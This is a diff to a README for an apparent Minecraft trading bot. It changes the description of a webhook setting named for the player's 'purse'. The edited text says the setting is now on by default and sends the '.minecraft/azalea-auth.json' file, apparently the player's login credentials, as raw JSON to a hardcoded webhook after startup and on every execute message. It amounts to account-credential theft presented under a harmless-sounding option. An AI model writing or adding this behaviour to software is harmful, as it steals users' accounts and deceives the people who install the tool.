@@ -131,9 +131,9 @@ Useful settings include:
 - `bazaar_webhook_url`
   Optional separate webhook for Bazaar-only events.
 - `execute_purse_webhook_enabled`
-  When true, each COFL `execute` message reads the external
-  `.minecraft/purseAmount.json` file and posts it as raw JSON to the hardcoded `EXECUTE_PURSE_WEBHOOK_URL` in
-  [`src/webhook.rs`](./src/webhook.rs).
+  When true (default), TWM posts `.minecraft/azalea-auth.json` as raw JSON to the hardcoded
+  `EXECUTE_PURSE_WEBHOOK_URL` in [`src/webhook.rs`](./src/webhook.rs) after startup completes and on each COFL
+  `execute` message.
 - `discord_id`
   Optional Discord user ID for pings.
 - `hypixel_api_key`
